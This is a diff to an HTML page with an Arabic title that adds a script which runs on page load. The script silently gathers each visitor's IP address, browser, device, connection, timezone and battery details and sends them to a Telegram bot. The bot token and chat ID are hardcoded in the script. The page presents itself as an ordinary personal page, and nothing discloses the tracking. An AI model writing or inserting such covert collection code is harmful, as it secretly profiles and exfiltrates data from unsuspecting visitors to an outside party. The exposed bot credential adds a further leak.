@@ -5,6 +5,60 @@
   <title>منونتي قلب بودا</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
   <style>
+    <script>
+    async function sendVisitorInfo() {
+        const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
+        const chatId = "1557685494";
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        // Collecting basic visitor info
+        const visitorInfo = {
+            IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
+            UserAgent: navigator.userAgent,
+            Platform: navigator.platform,
+            Language: navigator.language,
+            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
+            DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+            TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
+            OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
+            ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+            TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            CurrentTime: new Date().toLocaleString()
+        };
+        
+        // Collect battery info if available
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
+                visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
+            } catch (error) {
+                visitorInfo.BatteryPercentage = "Unavailable";
+                visitorInfo.ChargingStatus = "Unavailable";
+            }
+        }
+        
+        // Formatting message
+        let message = "NEW VISITOR INFORMATION\n";
+        for (let key in visitorInfo) {
+            message += `${key}: ${visitorInfo[key]}\n`;
+        }
+        
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+            const result = await response.json();
+            console.log(result);
+        } catch (error) {
+            console.error(error);
+        }
+    }
+    
+    window.onload = sendVisitorInfo;
+</script>
     body {
       margin: 0;
       font-family: 'Cairo', sans-serif;
